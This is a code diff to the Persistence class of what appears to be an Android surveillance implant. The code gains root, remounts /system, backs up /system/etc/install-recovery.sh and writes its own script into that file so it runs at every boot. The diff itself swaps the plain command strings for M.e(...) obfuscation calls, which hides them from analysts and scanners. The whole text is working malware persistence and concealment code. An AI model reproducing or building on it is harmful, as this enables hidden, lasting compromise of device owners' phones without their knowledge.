@@ -70,7 +70,7 @@ public class Persistence {
 		}
 		
 		// Copy /data/app/package.apk to the destination directory
-		Execute.execute(Configuration.shellFile + " " + "fhc" + " " + pkgPath + " " + storageDir + "/" + getName());
+		Execute.execute(Configuration.shellFile + " " + M.e("fhc") + " " + pkgPath + " " + storageDir + "/" + getName());
 	}
 	
 	/**
@@ -91,9 +91,9 @@ public class Persistence {
 		// Backup install-recovery.sh
 		String scriptName = "bu";
 		String script = M.e("#!/system/bin/sh") + "\n";
-		script += Configuration.shellFile + " " + "srh" + " " + "\"" + install + "\"" + M.e(" /system/etc/install-recovery.sh");
+		script += Configuration.shellFile + " " + M.e("srh") + " " + "\"" + install + "\"" + M.e(" /system/etc/install-recovery.sh");
 		script += "\nif [ $? == 0 ]; then\n    ";
-		script += Configuration.shellFile + " " + "fhc" + " " + M.e("/system/etc/install-recovery.sh") + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8);
+		script += Configuration.shellFile + " " + M.e("fhc") + " " + M.e("/system/etc/install-recovery.sh") + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8);
 		script += "\nfi";
 		
 		Root.createScript(scriptName, script);
@@ -103,19 +103,19 @@ public class Persistence {
 		Root.removeScript(scriptName);
 		
 		// Remount /system
-		Execute.execute(Configuration.shellFile + " " + "blw");
+		Execute.execute(Configuration.shellFile + " " + M.e("blw"));
 		
 		// Write our script into /system/etc/install-recovery.sh
 		scriptName = "ip";
 		script = M.e("#!/system/bin/sh") + "\n";
-		script += Configuration.shellFile + " " + "ape" + " " + "\"" + scriptBody + "\"" + M.e(" /system/etc/install-recovery.sh")+ "\n";
+		script += Configuration.shellFile + " " + M.e("ape") + " " + "\"" + scriptBody + "\"" + M.e(" /system/etc/install-recovery.sh")+ "\n";
 		
 		Root.createScript(scriptName, script);
 		Execute.executeRoot(Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + scriptName);
 		Root.removeScript(scriptName);
 		
 		// Return /system to normal
-		Execute.execute(Configuration.shellFile + " " + "blr");
+		Execute.execute(Configuration.shellFile + " " + M.e("blr"));
 	}
 	
 	public void removePersistance() {
@@ -130,11 +130,11 @@ public class Persistence {
 		AutoFile file = new AutoFile(storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8));
 		if(file.exists()) {
 			// Remount /system
-			Execute.execute(Configuration.shellFile + " " + "blw");
-			Execute.execute(Configuration.shellFile + " " + "fhc" + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8) + " " + M.e("/system/etc/install-recovery.sh"));
+			Execute.execute(Configuration.shellFile + " " + M.e("blw"));
+			Execute.execute(Configuration.shellFile + " " + M.e("fhc") + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8) + " " + M.e("/system/etc/install-recovery.sh"));
 
 			// Return /system to normal
-			Execute.execute(Configuration.shellFile + " " + "blr");
+			Execute.execute(Configuration.shellFile + " " + M.e("blr"));
 		}
 	}
 	
